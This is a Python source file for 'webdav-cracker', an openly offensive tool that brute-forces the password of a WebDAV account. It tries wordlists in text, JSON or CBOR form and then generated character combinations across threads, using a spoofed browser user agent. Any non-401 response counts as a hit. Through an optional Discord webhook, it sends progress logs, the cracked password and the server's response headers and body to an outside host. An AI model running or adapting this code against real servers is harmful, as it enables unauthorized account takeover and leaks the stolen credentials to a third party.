##################################################################
#                                                                #
#                         webdav-cracker                         #
#                                                                #
#                Copyright (C) 2022 X Gamer Guide                #
#         https://github.com/X-Gamer-Guide/webdav-cracker        #
#                                                                #
#               don't learn to hack, hack to learn               #
#                                                                #
##################################################################


import argparse
import base64
import itertools
import json
import queue
import string
import threading
import time
from typing import Tuple

import cbor
import requests

parser = argparse.ArgumentParser(
    "webdav cracker",
    description="A tool to get access to a WEBDAV server",
    epilog="Copyright (C) 2022 X Gamer Guide"
)


parser.add_argument(
    "--url",
    required=True,
    type=str,
    help="The DAV URL of the target"
)

parser.add_argument(
    "--username",
    required=True,
    type=str,
    help="Username to attack",
    default="admin"
)

parser.add_argument(
    "--user_agent",
    type=str,
    help="User agent for the requests",
    default="Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0"
)

parser.add_argument(
    "--threads",
    type=int,
    help="The number of threads used",
    default=1
)

parser.add_argument(
    "--b64_letters",
    type=str,
    help="The letters used to attack (base64 encoded)",
    default=base64.b64encode(
        (
            string.ascii_letters + string.digits + string.punctuation
        ).encode()
    ).decode()
)

parser.add_argument(
    "--start",
    type=str,
    help="The last letters that were seen in the terminal when it was last run. At this point the program continues",
    default="a"
)

parser.add_argument(
    "--passwords",
    type=argparse.FileType("r"),
    help="A file with passwords separated by \\n. After the file has been tried, the normal burte force mode turns on"
)

parser.add_argument(
    "--json_passwords",
    type=argparse.FileType("r"),
    help="A JSON file with passwords. After the file has been tried, the normal burte force mode turns on"
)

parser.add_argument(
    "--cbor_passwords",
    type=argparse.FileType("rb"),
    help="A CBOR file with passwords. After the file has been tried, the normal burte force mode turns on"
)

parser.add_argument(
    "--webhook",
    type=str,
    help="A Discord webhook to which information is transmitted"
)


# get command line args
args = parser.parse_args()

# decode letters
letters = base64.b64decode(args.b64_letters).decode()

# get index directory path
if args.url.endswith("/"):
    url = f"{args.url}."
else:
    url = f"{args.url}/."

# create WEBDAV session
dav = requests.session()
dav.headers = {
    "User-Agent": args.user_agent
}


class Discord:
    def __init__(self):
        self.session = requests.session()
        self.tasks = queue.Queue()

    def run(self):
        while True:
            data = self.tasks.get()
            while True:
                r = self.session.post(
                    args.webhook,
                    json=data
                )
                if r.status_code == 429:
                    time.sleep(r.json()['retry_after'] / 1000)
                    continue
                break
            self.tasks.task_done()

    def send(self, data) -> None:
        self.tasks.put(data)


discord = Discord()
threading.Thread(target=discord.run, daemon=True).start()


class WEBDAV:
    def __init__(self):
        self.started = False
        self.exit = None

    def log(self, data):
        msg = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}"
        print(msg)
        if args.webhook is not None:
            discord.send({
                "content": msg
            })

    def run(self) -> Tuple[requests.Response, str]:
        # brute force password file
        if args.passwords is not None:
            passwords = []
            for index, password in enumerate(args.passwords):
                while True:
                    if self.exit is not None:
                        return self.exit
                    if threading.active_count() < args.threads + 2:
                        passwords.append(password.strip())
                        if len(passwords) > 100:
                            self.log(f"password list {index}")
                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                            passwords = []
                        break
                    time.sleep(0.1)
            self.log("password list end")
            self.check_passwords(passwords)
        # brute force JSON password file
        if args.json_passwords is not None:
            passwords = []
            for index, password in enumerate(json.load(args.json_passwords)):
                while True:
                    if self.exit is not None:
                        return self.exit
                    if threading.active_count() < args.threads + 2:
                        passwords.append(password)
                        if len(passwords) > 100:
                            self.log(f"JSON password list {index}")
                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                            passwords = []
                        break
                    time.sleep(0.1)
            self.log("JSON password list end")
            self.check_passwords(passwords)
        # brute force CBOR password file
        if args.cbor_passwords is not None:
            passwords = []
            for index, password in enumerate(cbor.load(args.cbor_passwords)):
                while True:
                    if self.exit is not None:
                        return self.exit
                    if threading.active_count() < args.threads + 2:
                        passwords.append(password)
                        if len(passwords) > 100:
                            self.log(f"CBOR password list {index}")
                            threading.Thread(target=self.check_passwords, daemon=True, args=(passwords,)).start()
                            passwords = []
                        break
                    time.sleep(0.1)
            self.log("CBOR password list end")
            self.check_passwords(passwords)
        # standard berute force
        i = len(args.start)
        while True:
            i += 1
            for j in map("".join, itertools.product(letters, repeat=i-1)):
                while True:
                    if self.exit is not None:
                        return self.exit
                    if not self.started:
                        if args.start != j:
                            break
                        self.started = True
                    if threading.active_count() < args.threads + 2:
                        self.log(f"{j} ..")
                        threading.Thread(target=self.brute_force, daemon=True, args=(j,)).start()
                        break
                    time.sleep(0.1)

    def check(self, password) -> None:
        # check for rights
        r = dav.request(
            "PROPFIND",
            url,
            headers={
                "Depth": "1"
            },
            auth=(
                args.username,
                password
            )
        )
        # evaluate the response of the server
        if r.status_code != 401:
            self.exit = r, password

    def brute_force(self, start) -> None:
        for i in range(2):
            for j in map("".join, itertools.product(letters, repeat=i+1)):
                self.check(f"{start}{j}")

    def check_passwords(self, passwords) -> None:
        for password in passwords:
            self.check(password)


webdav = WEBDAV()
r, password = webdav.run()


print("-" * 80)
print(r.text)
print("-" * 80)
print(r.status_code)
print("-" * 80)
print(r.headers)
print("-" * 80)
print(f"USER: {args.username}")
print(f"PASSWORD: {password}")

if args.webhook is not None:
    if len(r.text) < 4000:
        description = f"```html\n{r.text}\n```"
    else:
        description = f"```html\n{r.text[:4000]}\n```... ({4000 - len(r.text)})"
    fields = []
    for header in r.headers:
        if len(r.headers[header]) < 1000:
            value = f"`{r.headers[header]}`"
        else:
            value = f"`{r.headers[header][1000:]}` ... ({1000 - len(r.headers[header])})"
        fields.append({
            "name": header,
            "value": value
        })
    discord.send({
        "embeds": [
            {
                "title": password,
                "description": description,
                "color": 0x8E04B9,
                "fields": fields,
                "author": {
                    "name": f"Password found for {args.username}"
                },
                "footer": {
                    "text": f"status: {r.status_code}"
                }
            }
        ]
    })


discord.tasks.join()
